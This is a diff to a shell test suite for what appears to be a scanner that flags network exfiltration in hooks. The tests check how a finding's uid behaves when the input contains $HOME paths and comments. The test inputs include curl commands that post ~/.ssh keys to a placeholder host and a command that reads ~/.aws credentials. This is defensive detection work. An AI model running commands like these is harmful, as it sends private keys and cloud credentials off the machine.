@@ -243,13 +243,15 @@ test_network_exfiltration_uid_keeps_or_moves_with_its_names() {
 }
 # 0.6.1 uid: a $HOME form changes the uid only when it changes what the excerpt hashes. Each literal is sha256sum of
 # HOOK-004|h4/x.sh|net=curl;path=<names>[;lines=<sha256 of the both-lines, byte-sorted>], computed outside the lib
-# (the line digests also from sha256sum). A $HOME line with no network name, or one in a comment, adds no name and no
-# both-line: the uid stays at the literal the same file had before.
+# (the line digests also from sha256sum). A $HOME line with no network name adds no name and no both-line, so the uid
+# stays at the literal the same file had before. A comment is a line like any other: one holding a network name moves it.
 test_network_exfiltration_home_forms_keep_or_move_the_uid() {
   local l1='curl -d @~/.ssh/k h'
   assert_eq "FUID-9aa0493e" "$(_h4 "$l1")" "baseline: one ~/.ssh both-line" || return 1
   assert_eq "FUID-9aa0493e" "$(_h4 "$l1"$'\n''cp $HOME/.ssh/x /b')" "a \$HOME line with no network name keeps it" || return 1
   assert_eq "FUID-9aa0493e" "$(_h4 "$l1"$'\n''# keys live in $HOME/.ssh')" "a \$HOME root in a comment keeps it" || return 1
+  local cm; cm="$(_h4 "$l1"$'\n''# curl -d @$HOME/.ssh/k h')"
+  assert_eq "moved" "$([[ "$cm" == FUID-* && "$cm" != "FUID-9aa0493e" ]] && echo moved)" "a comment holding a network name moves it" || return 1
   assert_eq "FUID-0ffb22c4" "$(_h4 "$l1"$'\n''curl -d @$HOME/.ssh/k h')" "a second both-line through \$HOME moves it" || return 1
   assert_eq "FUID-dba47ff3" "$(_h4 "$l1"$'\n''cat $HOME/.aws/c')" "a new name through \$HOME moves it (path=~/.ssh,~/.aws)" || return 1
   assert_eq "FUID-88f21ff2" "$(_h4 $'F=$HOME/.ssh/k\ncurl -d @~/.aws/c h')" "a new name from a \$HOME line moves it (was path=~/.aws)" || return 1
